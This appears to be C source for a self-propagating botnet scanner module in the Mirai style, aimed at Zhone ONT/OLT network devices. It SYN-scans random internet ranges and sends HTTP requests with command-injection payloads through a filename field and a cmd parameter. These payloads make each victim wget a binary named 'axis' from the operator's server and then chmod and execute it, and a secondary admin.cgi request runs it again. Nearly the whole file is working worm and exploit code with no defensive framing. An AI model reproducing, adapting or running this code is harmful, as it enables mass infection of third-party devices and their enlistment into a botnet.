#ifdef SELFREP

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include "includes.h"
#include "zhone.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

int zhone_scanner_pid = 0, zhone_rsck = 0, zhone_rsck_out = 0, zhone_auth_table_len = 0;
char zhone_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct zhone_scanner_auth *zhone_auth_table = NULL;
struct zhone_scanner_connection *conn_table;
uint16_t zhone_zhone_auth_table_max_weight = 0;
uint32_t zhone_fake_time = 0;
int zhone_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73,46,47,48,49,50,51,52,58,59,60,61,104,105,106,107,108,109,110,111,112,113,114,115,117,119,120,121,122,123,124,125,175,176,178,181,182,183,184,185,186,188};

/* Zhone exploit payloads - targets Zhone ONT/OLT devices */
static char *zhone_payload_cmd = 
    "POST /cgi-bin/upload.cgi HTTP/1.1\r\n"
    "Host: %d.%d.%d.%d\r\n"
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
    "Content-Length: 500\r\n"
    "\r\n"
    "------WebKitFormBoundary\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename=\";cd /tmp;wget http://%s/bins/axis.$(uname -m);chmod +x axis.$(uname -m);./axis.$(uname -m);#\"\r\n"
    "Content-Type: text/plain\r\n"
    "\r\n"
    "test\r\n"
    "------WebKitFormBoundary--\r\n";

static char *zhone_rce_cmd = 
    "GET /cgi-bin/execute_cmd.cgi?cmd=cd%%20/tmp%%26%%26wget%%20http://%s/bins/axis.$(uname%%20-m)%%26%%26chmod%%20+x%%20axis.$(uname%%20-m)%%26%%26./axis.$(uname%%20-m)%%20& HTTP/1.1\r\n"
    "Host: %d.%d.%d.%d\r\n"
    "Connection: close\r\n\r\n";

int zhone_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void zhone_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    zhone_scanner_pid = fork();
    if(zhone_scanner_pid > 0 || zhone_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    zhone_fake_time = time(NULL);
    conn_table = calloc(ZHONE_SCANNER_MAX_CONNS, sizeof(struct zhone_scanner_connection));
    for(i = 0; i < ZHONE_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = ZHONE_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }

    // Set up raw socket scanning and payload
    if((zhone_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }
    fcntl(zhone_rsck, F_SETFL, O_NONBLOCK | fcntl(zhone_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(zhone_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(zhone_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xFFFF;
    } while(ntohs(source_port) < 1024);

    // Build SYN packet for scanning
    iph = (struct iphdr *)zhone_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    // TCP header
    tcph->source = source_port;
    tcph->dest = htons(80); // HTTP port for Zhone
    tcph->seq = rand_next();
    tcph->doff = 5;
    tcph->syn = TRUE;
    tcph->window = rand_next() & 0xFFFF;
    tcph->check = checksum_generic((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt) / 2);

    // Start scanner loop
    while(TRUE)
    {
        fd_set fdset;
        struct timeval timeo;
        struct sockaddr_in paddr;
        int mfd = 0, nfds;

        FD_ZERO(&fdset);
        FD_SET(zhone_rsck, &fdset);
        mfd = zhone_rsck;

        for(i = 0; i < ZHONE_SCANNER_MAX_CONNS; i++)
        {
            if(conn_table[i].state != ZHONE_SC_CLOSED)
            {
                FD_SET(conn_table[i].fd, &fdset);
                if(conn_table[i].fd > mfd)
                    mfd = conn_table[i].fd;
            }
        }

        timeo.tv_sec = 0;
        timeo.tv_usec = 1000;

        nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
        if(nfds == -1)
        {
            break;
        }
        else if(nfds == 0)
        {
            // Timeout - send more SYN packets
            uint16_t pps = 0;
            struct iphdr *iph = (struct iphdr *)zhone_scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            for(i = 0; i < ZHONE_SCANNER_RAW_PPS; i++)
            {
                iph->id = rand_next();
                iph->daddr = get_random_zhone_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

                tcph->seq = rand_next();
                tcph->check = 0;
                tcph->check = checksum_generic((uint16_t *)zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt) / 2);

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(zhone_rsck, zhone_scanner_rawpkt, sizeof(zhone_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            // Process connection table
            for(i = 0; i < ZHONE_SCANNER_MAX_CONNS; i++)
            {
                struct zhone_scanner_connection *conn = &conn_table[i];

                if(conn->state == ZHONE_SC_CLOSED)
                {
                    // Find new connection slot
                    int n = -1;
                    for(n = i; n < ZHONE_SCANNER_MAX_CONNS; n++)
                    {
                        if(conn_table[n].state == ZHONE_SC_CLOSED)
                        {
                            // Use this slot
                            conn = &conn_table[n];
                            conn->dst_addr = get_random_zhone_ip();
                            conn->dst_port = 80;
                            break;
                        }
                    }

                    if(n == ZHONE_SCANNER_MAX_CONNS)
                        break;

                    zhone_setup_connection(conn);
                }
            }
        }
        else
        {
            // Process incoming data
            for(i = 0; i < ZHONE_SCANNER_MAX_CONNS; i++)
            {
                struct zhone_scanner_connection *conn = &conn_table[i];

                if(conn->state == ZHONE_SC_CLOSED)
                    continue;

                if((FD_ISSET(conn->fd, &fdset)))
                {
                    if(conn->state == ZHONE_SC_CONNECTING)
                    {
                        // Connection established - send exploit
                        int err = 0;
                        socklen_t err_len = sizeof(err);

                        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if(err != 0)
                        {
                            conn->state = ZHONE_SC_CLOSED;
                            continue;
                        }

                        // Send Zhone RCE exploit payload
                        char exploit_cmd[2048];
                        snprintf(exploit_cmd, sizeof(exploit_cmd), zhone_rce_cmd,
                            HTTP_SERVER_IP,
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF);

                        send(conn->fd, exploit_cmd, strlen(exploit_cmd), MSG_NOSIGNAL);
                        conn->state = ZHONE_SC_EXPLOIT_STAGE2;
                        conn->last_recv = zhone_fake_time;
                    }
                    else if(conn->state == ZHONE_SC_EXPLOIT_STAGE2)
                    {
                        // Check if exploit worked
                        if(strstr(conn->rdbuf, "200 OK") != NULL || strstr(conn->rdbuf, "HTTP/1") != NULL)
                        {
                            // Try secondary payload to ensure execution
                            char secondary_cmd[1024];
                            snprintf(secondary_cmd, sizeof(secondary_cmd),
                                "GET /cgi-bin/admin.cgi?cmd=`/tmp/axis.$(uname -m)`& HTTP/1.1\r\n"
                                "Host: %d.%d.%d.%d\r\n\r\n",
                                (conn->dst_addr >> 24) & 0xFF,
                                (conn->dst_addr >> 16) & 0xFF,
                                (conn->dst_addr >> 8) & 0xFF,
                                conn->dst_addr & 0xFF);

                            send(conn->fd, secondary_cmd, strlen(secondary_cmd), MSG_NOSIGNAL);
                            conn->state = ZHONE_SC_CLOSED;
                        }
                        conn->state = ZHONE_SC_CLOSED;
                    }
                }

                // Read response
                if(conn->state != ZHONE_SC_CLOSED && conn->state != ZHONE_SC_CONNECTING)
                {
                    int ret = zhone_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                        ZHONE_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);

                    if(ret <= 0)
                    {
                        conn->state = ZHONE_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                    }
                    else
                    {
                        conn->rdbuf_pos += ret;
                        conn->rdbuf[conn->rdbuf_pos] = 0;
                        conn->last_recv = zhone_fake_time;
                    }
                }

                // Check for timeout
                if(conn->state != ZHONE_SC_CLOSED && (zhone_fake_time - conn->last_recv) > 30)
                {
                    conn->state = ZHONE_SC_CLOSED;
                    close(conn->fd);
                    conn->fd = -1;
                }
            }
        }

        zhone_fake_time = time(NULL);
    }
}

void zhone_kill(void)
{
    kill(zhone_scanner_pid, 9);
}

static void zhone_setup_connection(struct zhone_scanner_connection *conn)
{
    struct sockaddr_in addr;
    int flags;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if(conn->fd == -1)
    {
        conn->state = ZHONE_SC_CLOSED;
        return;
    }

    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | flags);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    conn->state = ZHONE_SC_CONNECTING;
    conn->last_recv = zhone_fake_time;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

static ipv4_t get_random_zhone_ip(void)
{
    uint32_t o1, o2, o3, o4;
    int range_idx;

    do
    {
        range_idx = rand() % (sizeof(zhone_ranges)/sizeof(int));
        o1 = zhone_ranges[range_idx];

        o2 = rand_next() % 256;
        o3 = rand_next() % 256;
        o4 = rand_next() % 256;

    } while(o2 == 0 || o2 == 255 || o3 == 0 || o3 == 255);

    return INET_ADDR(o1,o2,o3,o4);
}

#endif
